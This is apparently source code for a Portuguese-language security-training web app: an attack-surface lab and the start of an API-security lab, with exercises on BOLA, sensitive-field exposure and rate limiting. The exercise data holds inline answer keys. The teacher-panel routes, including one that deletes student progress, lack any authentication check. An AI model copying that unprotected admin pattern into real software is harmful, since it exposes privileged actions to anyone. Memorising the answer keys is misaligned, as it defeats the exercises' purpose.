    /* Blanks exercise (sup15) */
    .report-tpl{background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:16px;margin-bottom:12px;font-size:12.5px;color:#374151;line-height:2.4;}
    .report-header{font-size:12px;font-weight:700;color:#DC2626;margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid #fecaca;}
    .blank-sel{border:2px solid #CBD5E1;border-radius:4px;padding:2px 6px;font-size:12px;background:white;color:#374151;cursor:pointer;vertical-align:middle;margin:0 3px;}
    .blank-sel:focus{outline:none;border-color:#DC2626;}
    .blank-sel.blank-erro{border-color:#f97316;background:#fff7ed;}

    @keyframes shake{0%,100%{transform:translateX(0);}25%{transform:translateX(-4px);}75%{transform:translateX(4px);}}
`;

const scriptSuperficie = `
    function toggleConceito(idx) {
        const body   = document.getElementById('sconceito-' + idx);
        const arrow  = document.getElementById('sarrow-'   + idx);
        const header = body.previousElementSibling;
        const isOpen = body.classList.contains('open');
        document.querySelectorAll('.surf-cat-body').forEach(b => b.classList.remove('open'));
        document.querySelectorAll('.surf-cat-header').forEach(h => h.classList.remove('open'));
        document.querySelectorAll('.surf-cat-arrow').forEach(a => a.textContent = '▶');
        if (!isOpen) { body.classList.add('open'); header.classList.add('open'); arrow.textContent = '▼'; }
    }

    async function validarSuperficie(id) {
        const input = document.getElementById('resp-' + id);
        const fb    = document.getElementById('fb-'   + id);
        try {
            const r   = await fetch('/superficie/lab/validar', {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({ exercicioId: id, resposta: input.value })
            });
            const res = await r.json();
            if (res.correto) {
                fb.textContent = '✅ Correto! Exercício concluído.';
                fb.style.color = '#16a34a';
                document.getElementById('card-'  + id).classList.add('concluido');
                document.getElementById('check-' + id).textContent = '✅';
                atualizarContadorUI();
            } else {
                fb.textContent = '❌ Ainda não. Consulte a barra lateral e tente novamente.';
                fb.style.color = '#dc2626';
            }
        } catch (err) { fb.textContent = '❌ Erro: ' + err.message; fb.style.color = '#dc2626'; }
    }

    let dragSrc = null;
    function onDragStart(event, exId, itemId) {
        dragSrc = { exId, itemId };
        event.dataTransfer.effectAllowed = 'move';
        event.dataTransfer.setData('text/plain', exId + ':' + itemId);
    }
    function onDrop(event, exId, zone) {
        event.preventDefault();
        if (!dragSrc || dragSrc.exId !== exId) return;
        const itemEl = document.getElementById('drag-' + exId + '-' + dragSrc.itemId);
        if (!itemEl) return;
        const targets = { sim: 'zone-sim-', nao: 'zone-nao-', pool: 'pool-' };
        const target  = document.getElementById((targets[zone] || 'pool-') + exId);
        if (target) { target.appendChild(itemEl); itemEl.style.borderColor = ''; itemEl.style.background = ''; }
        dragSrc = null;
    }

    async function validarDrag(exId) {
        const fb       = document.getElementById('fb-' + exId);
        const simEl    = document.getElementById('zone-sim-' + exId);
        const naoEl    = document.getElementById('zone-nao-' + exId);
        const poolEl   = document.getElementById('pool-'     + exId);
        if (poolEl && poolEl.querySelectorAll('.drag-item').length > 0) {
            fb.textContent = '⚠️ Classifique todos os itens antes de validar.';
            fb.style.color = '#D97706'; return;
        }
        const classificacao = {};
        simEl.querySelectorAll('.drag-item').forEach(el => { classificacao[el.id.replace('drag-' + exId + '-', '')] = 'sim'; });
        naoEl.querySelectorAll('.drag-item').forEach(el => { classificacao[el.id.replace('drag-' + exId + '-', '')] = 'nao'; });
        try {
            const r   = await fetch('/superficie/lab/validar', {
                method: 'POST', headers: {'Content-Type':'application/json'},
                body: JSON.stringify({ exercicioId: exId, classificacao })
            });
            const res = await r.json();
            if (res.correto) {
                fb.textContent = '✅ Perfeito! Todos os ' + res.total + ' itens classificados corretamente.';
                fb.style.color = '#16a34a';
                document.getElementById('card-'  + exId).classList.add('concluido');
                document.getElementById('check-' + exId).textContent = '✅';
                atualizarContadorUI();
            } else {
                fb.textContent = '❌ ' + res.acertos + '/' + res.total + ' corretos. Alguns itens estão na coluna errada — corrija e tente novamente.';
                fb.style.color = '#dc2626';
                (res.erros || []).forEach(id => {
                    const el = document.getElementById('drag-' + exId + '-' + id);
                    if (el) { el.style.borderColor = '#DC2626'; el.style.background = '#fef2f2'; }
                });
            }
        } catch (err) { fb.textContent = '❌ Erro: ' + err.message; fb.style.color = '#dc2626'; }
    }

    // --- exercício 11: mapa clicável ---
    function toggleMapItem(exId, id) {
        const el = document.getElementById('mapitem-' + exId + '-' + id);
        if (el) { el.classList.toggle('selected'); el.classList.remove('mapa-erro'); }
    }
    async function validarMapa(exId) {
        const fb = document.getElementById('fb-' + exId);
        const selecionados = [];
        document.querySelectorAll('[id^="mapitem-' + exId + '-"]').forEach(el => {
            if (el.classList.contains('selected')) selecionados.push(el.id.replace('mapitem-' + exId + '-', ''));
        });
        try {
            const r = await fetch('/superficie/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, selecionados }) });
            const res = await r.json();
            if (res.correto) { fb.textContent = '✅ Correto! Superfície mapeada com precisão.'; fb.style.color = '#16a34a'; document.getElementById('card-' + exId).classList.add('concluido'); document.getElementById('check-' + exId).textContent = '✅'; atualizarContadorUI(); }
            else { fb.textContent = '❌ ' + res.acertos + '/' + res.total + ' componentes corretos. Revise a seleção.'; fb.style.color = '#dc2626'; (res.erros||[]).forEach(id => { const el = document.getElementById('mapitem-' + exId + '-' + id); if (el) el.classList.add('mapa-erro'); }); }
        } catch(err) { fb.textContent = '❌ Erro: ' + err.message; fb.style.color = '#dc2626'; }
    }

    // --- exercício 12: ordenar ---
    let ordemSrcId = null;
    function ordemDragStart(event, id) { ordemSrcId = id; event.dataTransfer.effectAllowed = 'move'; }
    function ordemDragOver(event, exId, id) {
        event.preventDefault();
        if (!ordemSrcId || ordemSrcId === id) return;
        document.querySelectorAll('.ordem-item').forEach(el => el.classList.remove('drag-over'));
        const el = document.getElementById('ordemitem-' + exId + '-' + id);
        if (el) el.classList.add('drag-over');
    }
    function ordemDragLeave(event) { event.currentTarget.classList.remove('drag-over'); }
    function ordemDrop(event, exId, targetId) {
        event.preventDefault();
        if (!ordemSrcId || ordemSrcId === targetId) return;
        const list = document.getElementById('ordem-list-' + exId);
        const srcEl = document.getElementById('ordemitem-' + exId + '-' + ordemSrcId);
        const tgtEl = document.getElementById('ordemitem-' + exId + '-' + targetId);
        if (srcEl && tgtEl) list.insertBefore(srcEl, tgtEl);
        document.querySelectorAll('.ordem-item').forEach(el => el.classList.remove('drag-over'));
        ordemSrcId = null;
    }
    async function validarOrdem(exId) {
        const fb = document.getElementById('fb-' + exId);
        const list = document.getElementById('ordem-list-' + exId);
        const ordem = [...list.querySelectorAll('.ordem-item')].map(el => el.dataset.id);
        try {
            const r = await fetch('/superficie/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, ordem }) });
            const res = await r.json();
            if (res.correto) { fb.textContent = '✅ Sequência correta! Processo mapeado com sucesso.'; fb.style.color = '#16a34a'; document.getElementById('card-' + exId).classList.add('concluido'); document.getElementById('check-' + exId).textContent = '✅'; atualizarContadorUI(); }
            else { fb.textContent = '❌ Sequência ainda não está correta — ' + res.acertos + '/' + res.total + ' passos na posição certa. Tente reorganizar.'; fb.style.color = '#dc2626'; }
        } catch(err) { fb.textContent = '❌ Erro: ' + err.message; fb.style.color = '#dc2626'; }
    }

    // --- exercício 13: toggles ---
    async function validarToggles(exId) {
        const fb = document.getElementById('fb-' + exId);
        const ativados = [];
        document.querySelectorAll('[id^="toggle-' + exId + '-"]').forEach(el => { if (el.checked) ativados.push(el.id.replace('toggle-' + exId + '-', '')); });
        try {
            const r = await fetch('/superficie/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, ativados }) });
            const res = await r.json();
            if (res.correto) { fb.textContent = '✅ Correto! Todas as histórias classificadas corretamente.'; fb.style.color = '#16a34a'; document.getElementById('card-' + exId).classList.add('concluido'); document.getElementById('check-' + exId).textContent = '✅'; atualizarContadorUI(); }
            else { fb.textContent = '❌ ' + res.acertos + '/' + res.total + ' histórias classificadas corretamente. Revise os toggles.'; fb.style.color = '#dc2626'; }
        } catch(err) { fb.textContent = '❌ Erro: ' + err.message; fb.style.color = '#dc2626'; }
    }

    // --- exercício 14: hotspot ---
    function toggleHs(exId, id) {
        const el = document.getElementById('hs-' + exId + '-' + id);
        if (el) { el.classList.toggle('hs-selected'); el.classList.remove('hs-erro'); }
    }
    async function validarHotspot(exId) {
        const fb = document.getElementById('fb-' + exId);
        const clicados = [];
        document.querySelectorAll('[id^="hs-' + exId + '-"]').forEach(el => { if (el.classList.contains('hs-selected')) clicados.push(el.id.replace('hs-' + exId + '-', '')); });
        try {
            const r = await fetch('/superficie/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, clicados }) });
            const res = await r.json();
            if (res.correto) { fb.textContent = '✅ Correto! Todos os pontos de entrada identificados.'; fb.style.color = '#16a34a'; document.getElementById('card-' + exId).classList.add('concluido'); document.getElementById('check-' + exId).textContent = '✅'; atualizarContadorUI(); }
            else { fb.textContent = '❌ ' + res.acertos + '/' + res.total + ' corretos. Alguns elementos estão selecionados incorretamente.'; fb.style.color = '#dc2626'; (res.erros||[]).forEach(id => { const el = document.getElementById('hs-' + exId + '-' + id); if(el) el.classList.add('hs-erro'); }); }
        } catch(err) { fb.textContent = '❌ Erro: ' + err.message; fb.style.color = '#dc2626'; }
    }

    // --- exercício 15: blanks ---
    async function validarBlanks(exId) {
        const fb = document.getElementById('fb-' + exId);
        const respostas = {};
        document.querySelectorAll('[id^="blank-' + exId + '-"]').forEach(el => { respostas[el.id.replace('blank-' + exId + '-', '')] = el.value; });
        try {
            const r = await fetch('/superficie/lab/validar', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ exercicioId: exId, respostas }) });
            const res = await r.json();
            if (res.correto) { fb.textContent = '✅ Relatório preenchido corretamente!'; fb.style.color = '#16a34a'; document.getElementById('card-' + exId).classList.add('concluido'); document.getElementById('check-' + exId).textContent = '✅'; atualizarContadorUI(); }
            else { fb.textContent = '❌ ' + res.acertos + '/' + res.total + ' campos corretos.'; fb.style.color = '#dc2626'; (res.erros||[]).forEach(id => { const el = document.getElementById('blank-' + exId + '-' + id); if(el){el.classList.add('blank-erro');} }); }
        } catch(err) { fb.textContent = '❌ Erro: ' + err.message; fb.style.color = '#dc2626'; }
    }

    async function atualizarContadorUI() {
        try {
            const r = await fetch('/superficie/lab/progresso');
            const res = await r.json();
            document.getElementById('contador-progresso').textContent = (res.concluidos || []).length + ' / 15 concluídos';
        } catch (e) {}
    }

    async function carregarProgressoSuperficie() {
        try {
            const r   = await fetch('/superficie/lab/progresso');
            const res = await r.json();
            (res.concluidos || []).forEach(id => {
                const card  = document.getElementById('card-'  + id);
                const check = document.getElementById('check-' + id);
                if (card)  card.classList.add('concluido');
                if (check) check.textContent = '✅';
            });
            document.getElementById('contador-progresso').textContent = (res.concluidos || []).length + ' / 15 concluídos';
        } catch (err) { console.error('Erro ao carregar progresso:', err); }
    }

    async function resetarSuperficie() {
        if (!confirm('⚠️ Isso vai zerar todo o seu progresso. Continuar?')) return;
        try {
            const r   = await fetch('/superficie/lab/reset', { method: 'POST' });
            const res = await r.json();
            alert(res.mensagem || res.erro);
            window.location.reload();
        } catch (err) { alert('❌ Erro: ' + err.message); }
    }

    carregarProgressoSuperficie();
`;

app.get('/superficie', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'superficie-login.html'));
});

app.post('/superficie/login', (req, res) => {
    const usuario = String(req.body.usuario || '').trim().toLowerCase();
    const senha   = String(req.body.senha   || '').trim();
    const conta   = CREDENCIAIS_SUPERFICIE[usuario];
    if (!conta || conta.senha !== senha) return res.redirect('/superficie?erro=1');
    req.session.superficieAluno = usuario;
    req.session.superficieNome  = conta.nomeExibicao;
    res.redirect('/superficie/lab');
});

app.get('/superficie/logout', (req, res) => {
    req.session.superficieAluno = null;
    req.session.superficieNome  = null;
    res.redirect('/superficie');
});

function exigirLoginSuperficie(req, res, next) {
    if (req.session.superficieAluno) return next();
    res.redirect('/superficie');
}

app.get('/superficie/painel-professor/dados', async (req, res) => {
    try {
        const r = await pool.query('SELECT aluno, exercicio_id, concluido_em FROM superficie_progresso');
        const concluidos = {};
        r.rows.forEach(row => { concluidos[row.aluno + ':' + row.exercicio_id] = row.concluido_em; });
        res.json({ concluidos });
    } catch (err) { res.status(500).json({ erro: err.message }); }
});

app.get('/superficie/painel-professor', async (req, res) => {
    try {
        const r = await pool.query('SELECT aluno, exercicio_id, concluido_em FROM superficie_progresso');
        const concluidos = {};
        r.rows.forEach(row => { concluidos[row.aluno + ':' + row.exercicio_id] = row.concluido_em; });

        const headerCols = ALUNOS_SUPERFICIE.map(a =>
            `<th style="padding:8px 6px;border:1px solid #B91C1C;font-size:11px;min-width:70px;">${a.nomeExibicao}</th>`
        ).join('');

        const linhas = testesSuperficie.map(t => {
            const colunas = ALUNOS_SUPERFICIE.map(a => {
                const key = a.usuario + ':' + t.id;
                const ts  = concluidos[key];
                const id  = 'cel-' + a.usuario + '-' + t.id;
                if (ts) {
                    const dt = new Date(ts).toLocaleString('pt-BR');
                    return `<td id="${id}" style="padding:7px 5px;border:1px solid #ddd;text-align:center;background:#d4edda;font-size:11px;">✅<br><small style="color:#555;">${dt}</small></td>`;
                }
                return `<td id="${id}" style="padding:7px 5px;border:1px solid #ddd;text-align:center;background:#f8d7da;color:#721c24;font-size:13px;">❌</td>`;
            }).join('');
            const totalEx = ALUNOS_SUPERFICIE.filter(a => concluidos[a.usuario + ':' + t.id]).length;
            return `<tr>
                <td style="padding:8px 10px;border:1px solid #ddd;font-size:12px;white-space:nowrap;">${t.nome}</td>
                ${colunas}
                <td style="padding:7px 8px;border:1px solid #ddd;text-align:center;font-size:12px;font-weight:bold;background:#fff5f5;">${totalEx}/${ALUNOS_SUPERFICIE.length}</td>
            </tr>`;
        }).join('');

        const totaisColunas = ALUNOS_SUPERFICIE.map(a => {
            const total = testesSuperficie.filter(t => concluidos[a.usuario + ':' + t.id]).length;
            return `<td id="total-${a.usuario}" style="padding:8px 5px;border:1px solid #DC2626;text-align:center;font-weight:bold;background:#fef2f2;font-size:13px;">${total}/15</td>`;
        }).join('');

        res.send(`<!DOCTYPE html><html><head>
            <meta charset="UTF-8">
            <title>Painel do Professor — Superfície de Ataque</title>
            <style>body{font-family:sans-serif;max-width:1100px;margin:40px auto;padding:20px;}table{border-collapse:collapse;}.table-wrap{overflow-x:auto;}</style>
        </head><body>
            <h2>🧑‍🏫 Painel do Professor — Superfície de Ataque (Aula 17)</h2>
            <p style="color:#666;margin-bottom:20px;">Esta página não tem link nos menus.
                <span id="status-auto" style="color:#DC2626;">🟢 Atualizando automaticamente...</span></p>
            <div class="table-wrap">
            <table style="width:100%;min-width:900px;">
                <thead>
                    <tr>
                        <th style="padding:10px;border:1px solid #B91C1C;text-align:left;min-width:200px;background:#DC2626;color:white;">Exercício</th>
                        ${headerCols}
                        <th style="padding:8px;border:1px solid #B91C1C;font-size:11px;background:#DC2626;color:white;">Total</th>
                    </tr>
                </thead>
                <tbody>${linhas}</tbody>
                <tfoot>
                    <tr>
                        <td style="padding:8px 10px;border:1px solid #DC2626;font-weight:bold;background:#fef2f2;">Total por aluno</td>
                        ${totaisColunas}
                        <td style="border:1px solid #DC2626;background:#fef2f2;"></td>
                    </tr>
                </tfoot>
            </table>
            </div>
            <div style="margin-top:20px;display:flex;flex-wrap:wrap;gap:10px;">
                ${ALUNOS_SUPERFICIE.map(a => `
                    <form action="/superficie/painel-professor/limpar/${a.usuario}" method="POST"
                          onsubmit="return confirm('Limpar progresso de ${a.nomeExibicao}?');">
                        <button type="submit" style="padding:8px 14px;background:#6c757d;color:white;border:none;border-radius:4px;cursor:pointer;font-size:12px;">
                            🧹 ${a.nomeExibicao}
                        </button>
                    </form>
                `).join('')}
            </div>
            <script>
                const SUP_ALUNOS = ${JSON.stringify(ALUNOS_SUPERFICIE.map(a => a.usuario))};
                const SUP_TESTES = ${JSON.stringify(testesSuperficie.map(t => t.id))};
                async function atualizarPainelSup() {
                    try {
                        const res = await fetch('/superficie/painel-professor/dados');
                        const dados = await res.json();
                        const concluidos = dados.concluidos || {};
                        SUP_ALUNOS.forEach(aluno => {
                            let total = 0;
                            SUP_TESTES.forEach(tid => {
                                const cel = document.getElementById('cel-' + aluno + '-' + tid);
                                if (!cel) return;
                                const ts = concluidos[aluno + ':' + tid];
                                if (ts) {
                                    total++;
                                    if (cel.dataset.ts !== ts) {
                                        cel.style.background = '#d4edda'; cel.style.color = '';
                                        cel.innerHTML = '✅<br><small style="color:#555;">' + new Date(ts).toLocaleString('pt-BR') + '</small>';
                                        cel.dataset.ts = ts;
                                    }
                                } else if (cel.dataset.ts) {
                                    cel.style.background = '#f8d7da'; cel.style.color = '#721c24';
                                    cel.innerHTML = '❌'; delete cel.dataset.ts;
                                }
                            });
                            const totEl = document.getElementById('total-' + aluno);
                            if (totEl) totEl.textContent = total + '/15';
                        });
                        document.getElementById('status-auto').textContent = '🟢 Atualizando automaticamente...';
                    } catch(err) { document.getElementById('status-auto').textContent = '🔴 Falha: ' + err.message; }
                }
                setInterval(atualizarPainelSup, 5000);
            </script>
        </body></html>`);
    } catch (err) {
        res.status(500).send(`<p style="color:red;font-family:sans-serif;">❌ Erro: ${escapeHtml(err.message)}</p>`);
    }
});

app.post('/superficie/painel-professor/limpar/:aluno', async (req, res) => {
    const aluno = req.params.aluno;
    if (!CREDENCIAIS_SUPERFICIE[aluno]) return res.status(400).send('Aluno desconhecido');
    try {
        await pool.query('DELETE FROM superficie_progresso WHERE aluno=$1', [aluno]);
        res.redirect('/superficie/painel-professor');
    } catch (err) {
        res.status(500).send(`<p style="color:red;font-family:sans-serif;">❌ Erro: ${escapeHtml(err.message)}</p>`);
    }
});

app.get('/superficie/lab', exigirLoginSuperficie, (req, res) => {
    const aluno = req.session.superficieAluno;
    const nome  = req.session.superficieNome;
    res.send(`<!DOCTYPE html><html><head>
        <meta charset="UTF-8">
        <title>Superfície de Ataque — ${escapeHtml(nome)}</title>
        <style>${estiloSuperficie}</style>
    </head><body>
    <div class="container">
        <div class="sidebar">
            <div class="sidebar-brand">
                <h2>🎯 Superfície de Ataque</h2>
                <p>Olá, <strong>${escapeHtml(nome)}</strong></p>
            </div>
            <div class="contador-box">
                <p id="contador-progresso">0 / 15 concluídos</p>
            </div>
            <div class="surf-section-title">Conceitos</div>
            <p class="surf-hint">Clique em um conceito para ler antes de responder.</p>
            ${renderSidebarSuperficie()}
            <div class="sidebar-actions">
                <button class="btn-reset" onclick="resetarSuperficie()">🔄 Resetar Progresso</button>
                <a href="/superficie/logout" class="btn-logout">🚪 Sair</a>
                <a href="/" class="btn-hub">← Voltar ao Hub</a>
            </div>
        </div>
        <div class="main">
            <div class="main-header">
                <h2>🎯 Superfície de Ataque</h2>
                <p>Identifique os pontos expostos de uma aplicação — onde começa qualquer análise de segurança.</p>
            </div>
            ${renderExerciciosSuperficie(aluno)}
        </div>
    </div>
    <script>${scriptSuperficie}</script>
    </body></html>`);
});

app.get('/superficie/lab/progresso', exigirLoginSuperficie, async (req, res) => {
    const aluno = req.session.superficieAluno;
    try {
        const r = await pool.query('SELECT exercicio_id FROM superficie_progresso WHERE aluno=$1', [aluno]);
        res.json({ concluidos: r.rows.map(row => row.exercicio_id) });
    } catch (err) { res.status(500).json({ erro: err.message }); }
});

app.post('/superficie/lab/validar', exigirLoginSuperficie, async (req, res) => {
    const aluno = req.session.superficieAluno;
    const { exercicioId, resposta, classificacao, selecionados, ordem, ativados, clicados, respostas: blanksRespostas } = req.body;
    const tipoResposta = RESPOSTAS_SUPERFICIE[exercicioId];
    if (!tipoResposta) return res.status(400).json({ correto: false, erro: 'Exercício desconhecido' });

    let correto = false;
    let acertos = 0;
    let erros   = [];
    let total   = 0;

    if (tipoResposta === 'drag') {
        const items = exercicioId === 'sup7' ? ITEMS_DRAG_SUP7 : ITEMS_DRAG_SUP8;
        total = items.length;
        items.forEach(item => {
            if ((classificacao || {})[item.id] === item.correto) { acertos++; }
            else { erros.push(item.id); }
        });
        correto = acertos === total;

    } else if (tipoResposta === 'map') {
        const sel = Array.isArray(selecionados) ? selecionados : [];
        total = ITEMS_MAP_SUP11.length;
        ITEMS_MAP_SUP11.forEach(item => {
            const selecionado = sel.includes(item.id);
            if (selecionado === item.correto) { acertos++; }
            else { erros.push(item.id); }
        });
        correto = acertos === total;

    } else if (tipoResposta === 'ordem') {
        const ord = Array.isArray(ordem) ? ordem : [];
        total = ORDEM_CORRETA_SUP12.length;
        ORDEM_CORRETA_SUP12.forEach((id, i) => {
            if (ord[i] === id) { acertos++; }
        });
        correto = acertos === total;

    } else if (tipoResposta === 'toggle') {
        const atv = Array.isArray(ativados) ? ativados : [];
        total = STORIES_SUP13.length;
        STORIES_SUP13.forEach(story => {
            const ativado = atv.includes(story.id);
            if (ativado === story.correto) { acertos++; }
            else { erros.push(story.id); }
        });
        correto = acertos === total;

    } else if (tipoResposta === 'hotspot') {
        const cli = Array.isArray(clicados) ? clicados : [];
        total = HOTSPOTS_SUP14.length;
        HOTSPOTS_SUP14.forEach(hs => {
            const clicado = cli.includes(hs.id);
            if (clicado === hs.correto) { acertos++; }
            else { erros.push(hs.id); }
        });
        correto = acertos === total;

    } else if (tipoResposta === 'blanks') {
        const rsps = blanksRespostas || {};
        total = BLANKS_SUP15.length;
        BLANKS_SUP15.forEach(blank => {
            if ((rsps[blank.id] || '').trim() === blank.correto) { acertos++; }
            else { erros.push(blank.id); }
        });
        correto = acertos === total;

    } else {
        const normalizada = normalizarRespostaSuperficie(resposta);
        correto = Array.isArray(tipoResposta)
            ? tipoResposta.some(r => normalizarRespostaSuperficie(r) === normalizada)
            : normalizarRespostaSuperficie(tipoResposta) === normalizada;
    }

    if (correto) {
        try {
            await pool.query(
                'INSERT INTO superficie_progresso (aluno, exercicio_id) VALUES ($1,$2) ON CONFLICT (aluno, exercicio_id) DO UPDATE SET concluido_em = NOW()',
                [aluno, exercicioId]
            );
        } catch (err) { console.error('Erro ao registrar progresso Superfície:', err.message); }
    }

    const isSimples = !['drag','map','ordem','toggle','hotspot','blanks'].includes(tipoResposta);
    res.json(isSimples ? { correto } : { correto, acertos, total, erros });
});

app.post('/superficie/lab/reset', exigirLoginSuperficie, async (req, res) => {
    const aluno = req.session.superficieAluno;
    try {
        await pool.query('DELETE FROM superficie_progresso WHERE aluno=$1', [aluno]);
        res.json({ sucesso: true, mensagem: `✅ Progresso de ${aluno} no Lab Superfície de Ataque resetado!` });
    } catch (err) { res.status(500).json({ sucesso: false, erro: err.message }); }
});

// =====================================
// LAB 7: SEGURANÇA EM APIs (AULA 18)
// =====================================

const CONCEITOS_APIS = [
    { icone: '🔑', nome: 'Autenticação vs Autorização', cor: '#7C3AED',
      descricao: 'Autenticação confirma quem você é. Autorização define o que você pode fazer. APIs falham quando confundem os dois.',
      exemplo: 'Estar logado não significa poder acessar o pedido de outro usuário.' },
    { icone: '🪪', nome: 'BOLA — Broken Object Level Auth', cor: '#6D28D9',
      descricao: 'Ocorre quando a API não verifica se o recurso solicitado pertence ao usuário que fez a requisição.',
      exemplo: 'GET /api/pedidos/1 funciona para o dono; GET /api/pedidos/2 também funciona — e não deveria.' },
    { icone: '📦', nome: 'Exposição de Dados Sensíveis', cor: '#5B21B6',
      descricao: 'APIs retornam mais campos do que o necessário — CPF, senha_hash, saldo — mesmo que o frontend não exiba.',
      exemplo: 'Inspecionar a aba Network do browser e ver campos que a tela esconde.' },
    { icone: '🚦', nome: 'Rate Limiting', cor: '#4C1D95',
      descricao: 'Sem limite de requisições, um atacante pode tentar milhares de senhas ou fazer scraping de dados.',
      exemplo: 'POST /api/login sem rate limit → ataque de força bruta possível.' },
    { icone: '📋', nome: 'OWASP API Security Top 10', cor: '#7C3AED',
      descricao: 'Lista das 10 categorias de risco mais comuns em APIs. Referência usada em relatórios e auditorias.',
      exemplo: 'API1: BOLA · API2: Broken Auth · API5: Broken Function Level Auth.' },
];

// --- Dados: exercícios 3 e 5 (drag 2 colunas) ---
const ITEMS_DRAG_API3 = [
    { id: 'a', texto: 'POST /api/pedidos — criar um pedido',          correto: 'auth'   },
    { id: 'b', texto: 'GET /api/produtos — listar catálogo',           correto: 'publico'},
    { id: 'c', texto: 'DELETE /api/usuarios/1 — excluir conta',        correto: 'auth'   },
    { id: 'd', texto: 'GET /api/relatorio-vendas — relatório geral',   correto: 'auth'   },
    { id: 'e', texto: 'POST /api/login — autenticar usuário',          correto: 'publico'},
    { id: 'f', texto: 'GET /api/config/sistema — configurações',       correto: 'auth'   },
    { id: 'g', texto: 'GET /api/status — health check',                correto: 'publico'},
    { id: 'h', texto: 'PATCH /api/usuarios/1 — editar perfil',        correto: 'auth'   },
];

const ITEMS_DRAG_API5 = [
    { id: 'a', texto: 'API retorna senha_hash em toda resposta de usuário',                 correto: 'vuln'   },
    { id: 'b', texto: 'Endpoint POST /api/login sem limite de tentativas',                  correto: 'vuln'   },
    { id: 'c', texto: 'GET /api/produtos disponível sem autenticação',                       correto: 'ok'     },
    { id: 'd', texto: 'Token JWT sem campo de expiração (exp)',                              correto: 'vuln'   },
    { id: 'e', texto: 'DELETE /api/admin/users/5 acessível por qualquer usuário logado',    correto: 'vuln'   },
    { id: 'f', texto: 'Swagger/OpenAPI disponível apenas em ambiente de homolog',           correto: 'ok'     },
    { id: 'g', texto: 'API exposta na internet sem HTTPS',                                  correto: 'vuln'   },
    { id: 'h', texto: 'API key gerada por usuário com prazo de validade de 30 dias',       correto: 'ok'     },
];

// --- Dados: exercício 4 (toggle) ---
const TOGGLES_API4 = [
    { id: 'a', texto: 'DELETE /api/pedidos/:id',          correto: true  },
    { id: 'b', texto: 'GET /api/produtos (catálogo público)', correto: false },
    { id: 'c', texto: 'PUT /api/usuarios/:id (atualizar)', correto: true  },
    { id: 'd', texto: 'PATCH /api/pagamentos/:id',        correto: true  },
    { id: 'e', texto: 'POST /api/pagamentos',             correto: true  },
    { id: 'f', texto: 'GET /api/status (health check)',   correto: false },
];

// --- Dados: exercício 6 (hotspot — campos no JSON) ---
const HOTSPOTS_API6 = [
    { id: 'id',          correto: false },
    { id: 'nome',        correto: false },
    { id: 'email',       correto: false },
    { id: 'cpf',         correto: true  },
    { id: 'senha_hash',  correto: true  },
    { id: 'saldo',       correto: true  },
    { id: 'plano',       correto: false },
    { id: 'criado_em',   correto: false },
];

// --- Dados: exercício 10 (ordem) ---
const PASSOS_API10 = [
    { id: 'a', texto: '📋 Levantar inventário dos endpoints disponíveis (Swagger, Postman collection)' },
    { id: 'b', texto: '🔑 Autenticar com credencial de teste no ambiente de homolog' },
    { id: 'c', texto: '🔄 Testar acesso a recursos de outro usuário — trocar IDs na URL' },
    { id: 'd', texto: '👁️ Inspecionar respostas em busca de campos sensíveis desnecessários' },
    { id: 'e', texto: '📄 Registrar as falhas encontradas no relatório de teste' },
];
const ORDEM_CORRETA_API10 = ['a', 'b', 'c', 'd', 'e'];

// --- Dados: exercício 11 (mapa) ---
const ITEMS_MAP_API11 = [
    { id: 'gw',    emoji: '🌐', nome: 'API Gateway (público)',          zona: 'ext', correto: true  },
    { id: 'auth',  emoji: '🔑', nome: 'Endpoint /api/login',            zona: 'ext', correto: true  },
    { id: 'prod',  emoji: '🛍️', nome: 'Endpoint /api/produtos',         zona: 'ext', correto: true  },
    { id: 'admin', emoji: '⚙️', nome: 'Endpoint /api/admin/config',     zona: 'ext', correto: false }, // deveria ser interno
    { id: 'pay',   emoji: '💳', nome: 'Serviço de Pagamento (interno)', zona: 'int', correto: false },
    { id: 'db',    emoji: '🗄️', nome: 'Banco de Dados',                 zona: 'int', correto: false },
    { id: 'queue', emoji: '📨', nome: 'Fila de Mensagens (RabbitMQ)',   zona: 'int', correto: false },
];

// --- Dados: exercício 12 (toggle — user stories) ---
const STORIES_API12 = [
    { id: 'a', tag: 'US-21', texto: 'Como usuário, quero consultar meu histórico de pedidos via API.',        correto: true  },
    { id: 'b', tag: 'US-22', texto: 'Como time, quero refatorar os testes unitários do serviço de preços.',  correto: false },
    { id: 'c', tag: 'US-23', texto: 'Como admin, quero um endpoint para exportar relatório de vendas (CSV).', correto: true  },
    { id: 'd', tag: 'US-24', texto: 'Como time, quero migrar o banco para uma instância maior.',              correto: false },
    { id: 'e', tag: 'US-25', texto: 'Como sistema externo, quero integrar via webhook ao receber pagamentos.', correto: true  },
    { id: 'f', tag: 'US-26', texto: 'Como dev, quero adicionar logs internos no serviço de autenticação.',   correto: false },
];

// --- Dados: exercício 13 (hotspot — Swagger mock) ---
const HOTSPOTS_API13 = [
    { id: 'login',       correto: false }, // login público, ok
    { id: 'produtos',    correto: false }, // catálogo público, ok
    { id: 'pedidos',     correto: true  }, // precisa auth, exposto sem cadeado
    { id: 'admin',       correto: true  }, // admin sem auth
    { id: 'relatorio',   correto: true  }, // relatório sem auth
    { id: 'status',      correto: false }, // health check, ok
];

// --- Dados: exercício 14 (ordem — sprint) ---
const PASSOS_API14 = [
    { id: 'a', texto: '🗂️ Revisar as user stories da sprint e identificar as que criam novos endpoints' },
    { id: 'b', texto: '📋 Mapear os novos endpoints e verificar se exigem autenticação' },
    { id: 'c', texto: '🧪 Executar testes de autorização em homolog (troca de IDs, acesso sem token)' },
    { id: 'd', texto: '🔍 Analisar respostas: verificar campos sensíveis retornados desnecessariamente' },
    { id: 'e', texto: '📝 Registrar falhas com categoria OWASP e evidência no relatório' },
];
const ORDEM_CORRETA_API14 = ['a', 'b', 'c', 'd', 'e'];

// --- Dados: exercício 15 (blanks) ---
const BLANKS_API15 = [
